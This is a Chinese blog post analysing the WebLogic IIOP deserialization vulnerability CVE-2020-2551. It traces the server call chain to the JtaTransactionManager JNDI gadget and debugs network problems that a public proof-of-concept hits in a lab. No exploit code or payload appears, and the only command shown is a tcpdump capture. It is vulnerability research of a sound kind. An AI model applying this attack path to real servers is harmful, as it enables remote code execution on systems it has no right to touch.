+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220705540.png" alt="image-20200421220705540"></p>
+<p>这里和CORBA的写法是一样的，都是初始化orb获取Naming Service的过程，如果想要了解详细的过程，可以参考<a target="_blank" rel="noopener" href="https://paper.seebug.org/1124/">Java CORBA</a></p>
+<p>在获取了Context后，接着来看一下其绑定流程，此流程在bind函数中有所体现</p>
+<p>weblogic.corba.j2ee.naming.ContextImpl#bind(javax.naming.Name, java.lang.Object)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421221921678.png" alt="image-20200421221921678"></p>
+<p>这里完成的是生成IOR，同时设定corba协议中的数据类型与java类型交互的约定为tk_value，并设定请求的op或者叫做operation为bind_any。这里不仅仅设定了服务端对注册请求的处理方式（bind_any的处理流程），同时设定了后面反序列化的方式（tk_value）</p>
+<h3 id="Weblogic解析流程"><a href="#Weblogic解析流程" class="headerlink" title="Weblogic解析流程"></a>Weblogic解析流程</h3><p>在远程调试中下断点，运行<a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a></p>
+<p>weblogic.iiop.ConnectionManager#dispatch</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145612316.png" alt="image-20200422145612316"></p>
+<p>在该函数看到所有 IIOP 的请求信息</p>
+<p>weblogic.rmi.cluster.ClusterableServerRef#invoke</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145827253.png" alt="image-20200422145827253"></p>
+<p>weblogic.corba.idl.CorbaServerRef#invoke</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145953983.png" alt="image-20200422145953983"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150228254.png" alt="image-20200422150228254"></p>
+<p>这里首先会判断请求是否为objectMethods中已经存在的类型，当不存在时将会调用delegate.invoke来处理，由于我们在发送注册请求时的请求类型为bind_any&#x2F;rebind_any，并不在objectMethods中，所以会触发delegate._invoke，具体的实现类为</p>
+<p>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150921395.png" alt="image-20200422150921395"></p>
+<p>因为我们当前的请求类型为rebind_any，其所对应的var5为1，bind_any为0，但都会进入两个关键的流程</p>
+<ul>
+<li>WNameHelper.read(var2)</li>
+<li>var2.read_any()</li>
+</ul>
+<p>weblogic.corba.cos.naming.NamingContextAnyPackage.WNameHelper#read</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151050518.png" alt="image-20200422151050518"></p>
+<p>weblogic.corba.cos.naming.NamingContextAnyPackage.WNameComponentHelper#read</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151929872.png" alt="image-20200422151929872"></p>
+<p>在WNameHelper.read主要负责提取IOR中的信息（id、kind）用于之后注册到orb的流程中</p>
+<p>而反序列化的触发点在var2.read_any中</p>
+<p>weblogic.iiop.IIOPInputStream#read_any()</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152107646.png" alt="image-20200422152107646"></p>
+<p>在bind流程中发起注册请求时，会构造一个Any类，并将交互类型设置为tk_value也就是this.read_TypeCode()</p>
+<p>weblogic.corba.idl.AnyImpl#read_value_internal</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152508033.png" alt="image-20200422152508033"></p>
+<p>这里会根据TCKind来分派具体的处理流程，tk_value对应29</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152604876.png" alt="image-20200422152604876"></p>
+<p>接下来就是<a target="_blank" rel="noopener" href="https://paper.seebug.org/1124/">这篇文章</a>中所提到过的反序列化流程</p>
+<p>接着跟踪会运行到</p>
+<p>weblogic.iiop.IIOPInputStream#read_value(java.lang.Class)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154229127.png" alt="image-20200422154229127"></p>
+<p>在图中所示处下断点，然后F9，直到为var2为com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</p>
+<p>JtaTransactionManager就是spring爆出的一个可以JNDI注入的类，在weblogic中也存在</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154310751.png" alt="image-20200422154310751"></p>
+<p>weblogic.corba.utils.ValueHandlerImpl#allocateValue</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422160041827.png" alt="image-20200422160041827"></p>
+<p>allocateValue中通过反射获取实例</p>
+<p>weblogic.corba.utils.ValueHandlerImpl#readValue(weblogic.iiop.IIOPInputStream, weblogic.utils.io.ObjectStreamClass, java.lang.Object)</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154530489.png" alt="image-20200422154530489"></p>
+<p>weblogic.corba.utils.ValueHandlerImpl#readValueData</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154642371.png" alt="image-20200422154642371"></p>
+<p>判断是否有readObject方法之后进入自身的readObject</p>
+<p>weblogic.utils.io.ObjectStreamClass#readObject</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154803899.png" alt="image-20200422154803899"></p>
+<p>通过反射调用JtaTransactionManager的readObject</p>
+<p>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154835199.png" alt="image-20200422154835199"></p>
+<p>后面就同<a href="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Spring JtaTransactionManager 反序列化漏洞</a>了</p>
+<h2 id="解决POC-NAT网络问题"><a href="#解决POC-NAT网络问题" class="headerlink" title="解决POC NAT网络问题"></a>解决POC NAT网络问题</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>重启了下虚拟机，ip变了，重新编译下恶意类，目前ip</p>
+<blockquote>
+<p>Windows宿主机ip：192.168.110.1</p>
+<p>Linux虚拟机ip：192.168.110.4</p>
+<p>Weblogic Docker ip：172.17.0.2</p>
+</blockquote>
+<h4 id="Linux虚拟机中本地攻击Docker"><a href="#Linux虚拟机中本地攻击Docker" class="headerlink" title="Linux虚拟机中本地攻击Docker"></a>Linux虚拟机中本地攻击Docker</h4><p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203447874.png" alt="image-20200422203447874"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -n -i docker0 -w p.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203635043.png" alt="image-20200422203635043"></p>
+<p>通过IIOP向Weblogic请求NameService</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203852815.png" alt="image-20200422203852815"></p>
+<p>Weblogic返回NameService并指定bind地址，这里为0.0.0.0（参考文章中为Weblogic内网ip，暂不明原因），即指向本机，由于docker的7001端口映射到了虚拟机的7001端口，所以在虚拟机中访问0.0.0.0:7001仍然可以正常访问到Weblogic</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422204635800.png" alt="image-20200422204635800"></p>
+<p>客户端请求bind恶意序列化对象</p>
+<p>后面就是触发JNDI lookup，加载远程恶意类并成功执行命令</p>
+<h4 id="宿主机攻击虚拟机中Docker"><a href="#宿主机攻击虚拟机中Docker" class="headerlink" title="宿主机攻击虚拟机中Docker"></a>宿主机攻击虚拟机中Docker</h4><p>直接用Wireshark抓VMware NAT</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210424446.png" alt="image-20200422210424446"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210629980.png" alt="image-20200422210629980"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210707879.png" alt="image-20200422210707879"></p>
+<p>通过IIOP向Weblogic请求NameService</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210802102.png" alt="image-20200422210802102"></p>
+<p>Weblogic返回NameService并指定bind地址，这里还是为0.0.0.0，那么宿主机会请求到自己的7001端口，自然不能正常与Weblogic交互，导致后续利用失败，可以本地监听7001端口验证一下</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422211108285.png" alt="image-20200422211108285"></p>
+<p>其实这里只要通过端口转发把数据交给Weblogic的7001端口即可</p>
+<p>实测直接保存数据然后nc再发过去也行</p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220334597.png" alt="image-20200422220334597"></p>
+<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220347793.png" alt="image-20200422220347793"></p>
+<h3 id="重写客户端处理逻辑"><a href="#重写客户端处理逻辑" class="headerlink" title="重写客户端处理逻辑"></a>重写客户端处理逻辑</h3><p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">IDEA+docker，进行远程漏洞调试（weblogic）</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/post/weblogic-cve-2020-2551/">Weblogic CVE-2020-2551 IIOP协议反序列化RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7374">漫谈 WebLogic CVE-2020-2551</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nliao/p/3308669.html">Corba概念（GIOP、IIOP、IOR、ORB、IDL）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mosmith/p/5185379.html">CORBA IOR学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2662a2c4034a">Corba初体验——概要笔记</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1130/">WebLogic WLS 核心组件 RCE 分析（CVE-2020-2551）</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1105/">关于 Java 中的 RMI-IIOP</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Weblogic/" rel="tag"># Weblogic</a>
+              <a href="/tags/IIOP/" rel="tag"># IIOP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/04/17/Python-%E5%AE%9A%E5%88%B6QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/" rel="prev" title="Python 定制QQ机器人">
+                  <i class="fa fa-angle-left"></i> Python 定制QQ机器人
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/27/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" rel="next" title="通达OA 任意用户登录漏洞">
+                  通达OA 任意用户登录漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
